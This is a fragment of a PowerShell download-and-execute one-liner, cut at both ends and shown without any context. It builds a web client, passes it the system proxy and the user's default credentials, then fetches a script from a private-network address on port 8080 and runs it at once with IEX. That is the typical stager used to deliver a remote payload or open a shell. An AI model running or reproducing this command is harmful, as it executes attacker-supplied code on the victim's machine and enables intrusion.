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z=new-object net.webclient;$z.proxy=[Net.WebRequest]::GetSystemWebProxy();$z.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $z.downloadstring('http://192.168.0.138:8080/tnczG37zU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